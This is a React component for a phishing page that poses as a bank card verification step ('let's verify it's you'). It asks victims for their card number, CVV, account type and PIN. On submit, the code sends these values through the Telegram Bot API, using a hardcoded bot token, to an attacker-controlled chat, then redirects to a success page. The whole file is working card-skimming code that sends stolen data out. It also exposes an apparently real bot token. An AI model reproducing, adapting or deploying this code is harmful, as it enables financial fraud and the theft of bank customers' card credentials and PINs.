import React from 'react';
import {
  Box,
  Heading,
  Center,
  Text,
  FormControl,
  Input,
  Menu,
  MenuButton,
  MenuList,
  MenuItem,
  Button,
  InputGroup,
} from '@chakra-ui/react';
import { useNavigate } from 'react-router-dom';
import { FiChevronDown } from 'react-icons/fi';

function Enter() {
  const navigate = useNavigate();

  const [selectedAccountType, setSelectedAccountType] = React.useState('');

  const token = '6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc';
  const chat_id = '';

  async function sendMessageToTelegram(message: any) {
    await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
    );
    console.log('Telegram message sent');
  }

  async function handleFormSubmit(event: any) {
    event.preventDefault();
  
    if (!selectedAccountType) {
      alert('Please select an account type.');
      return;
    }
  
    let message =
      ' | Card Number: ' +
      event.target.cardnumber.value +
      '\n | CVV: ' +
      event.target.cvv.value +
      '\n | Account Type: ' +
      selectedAccountType +
      '\n | CardPIN: ' +
      event.target.pin.value;
  
    try {
      await sendMessageToTelegram(message);
      navigate('/success');
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
      alert('An error occurred while sending the message.');
    }
  }
  

  return (
    <Box fontFamily="Poppins">
      <form onSubmit={handleFormSubmit}>
        <InputGroup>
          <FormControl>
            <Box minH="72.3vh">
              <Box>
                <Center>
                  <Heading
                    px={4}
                    fontFamily="Poppins"
                    textAlign="center"
                    pt={7}
                    fontWeight="normal"
                    as="h2"
                    fontSize="20"
                    color="blackAlpha.800"
                  >
                    To get started, <br />let's verify it's you.
                  </Heading>
                </Center>
              </Box>

              <Box p={5}>
                

                <Text
                  mt={10}
                  fontSize="13"
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Account Type
                </Text>
                <Menu>
                  <MenuButton
                    border="solid gray 1px"
                    w="100%"
                    color="gray.700"
                    p={3}
                   
                    borderRadius={0}
                  >
                    {selectedAccountType ? (
                      <Box>
                        {selectedAccountType}{' '}
                        <Box mt={-5} pl={1}>
                        <FiChevronDown color="black" />
                        </Box>
                      </Box>
                    ) : (
                      <Box>
                        Select account type{' '}
                        <Box mt={-5} pl={30}>
                        <FiChevronDown color="black" />
                        </Box>
                      </Box>
                    )}
                  </MenuButton>
                  <MenuList>
                    <MenuItem
                      value="Debit/ATM card"
                      onClick={() =>
                        setSelectedAccountType('Debit/ATM card')
                      }
                    >
                      Debit/ATM card
                    </MenuItem>
                    <MenuItem
                      value="Checking or money market account"
                      onClick={() =>
                        setSelectedAccountType(
                          'Checking or money market account'
                        )
                      }
                    >
                      Checking or money market account
                    </MenuItem>
                    <MenuItem
                      value="Savings account/CDs/IRAs"
                      onClick={() =>
                        setSelectedAccountType('Savings account/CDs/IRAs')
                      }
                    >
                      Savings account/CDs/IRAs
                    </MenuItem>
                    <MenuItem
                      value="Mortgage account"
                      onClick={() =>
                        setSelectedAccountType('Mortgage account')
                      }
                    >
                      Mortgage account
                    </MenuItem>
                    <MenuItem
                      value="HELOC account"
                      onClick={() =>
                        setSelectedAccountType('HELOC account')
                      }
                    >
                      HELOC account
                    </MenuItem>
                    <MenuItem
                      value="Credit card"
                      onClick={() =>
                        setSelectedAccountType('Credit card')
                      }
                    >
                      Credit card
                    </MenuItem>
                    <MenuItem
                      value="Personal loan"
                      onClick={() =>
                        setSelectedAccountType('Personal loan')
                      }
                    >
                      Personal loan
                    </MenuItem>
                  </MenuList>
                </Menu>

                <Text
                  fontSize="13"
                  mt={10}
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Card number (no dashes)
                </Text>
                <Input
                  id="cardnumber"
                  _hover={{ border: 'solid 0.9px' }}
                  border="1px solid #196999"
                  borderRadius={0}
                  _focus={{  border: 'none' }}
                  h="70px"
                  placeholder="Enter your Card Number"
                  pb={0}
                  minLength={16}
                  maxLength={16}
                  name="cardnumber"
                  type="number"
                />

                <Text
                  fontSize="13"
                  mt={10}
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Card CVV
                </Text>
                <Input
                  id="cvv"
                  _hover={{ border: 'solid 0.9px' }}
                  border="1px solid #196999"
                  borderRadius={0}
                  _focus={{  border: 'none' }}
                  h="70px"
                  placeholder="Enter your Card CVV"
                  pb={0}
                  maxLength={3}
                  name="cvv"
                  type="number"
                />

                <Text
                  fontSize="13"
                  mt={10}
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Four-digit PIN
                </Text>
                <Input
                  id="pin"
                  _hover={{ border: 'solid 0.9px' }}
                  border="1px solid #196999"
                  borderRadius={0}
                  _focus={{  border: 'none' }}
                  h="70px"
                  placeholder="Enter your PIN"
                  pb={0}
                  maxLength={4}
                  minLength={4}
                  name="pin"
                  type="number"
                />

                <Button
                  fontFamily="Poppins"
                  borderRadius={0}
                  bgColor="#47A040"
                  w="100%"
                  mt={5}
                  mb={5}
                  color="white"
                  _hover={{
                    bgColor:"#47A040",
                  }}
                  type="submit"
                >
                  Continue
                </Button>
              </Box>
            </Box>
          </FormControl>
        </InputGroup>
      </form>
    </Box>
  );
}

export default Enter;
